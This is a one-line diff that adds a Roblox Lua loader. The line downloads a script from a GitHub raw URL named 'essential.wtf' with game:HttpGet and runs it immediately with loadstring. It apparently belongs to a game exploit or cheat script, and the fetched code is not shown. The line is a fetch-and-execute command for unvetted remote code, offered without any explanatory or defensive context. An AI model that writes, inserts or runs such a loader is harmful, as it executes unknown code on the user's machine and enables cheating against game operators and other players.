@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/DoesntMqtter/Script/main/essential.wtf"))() 
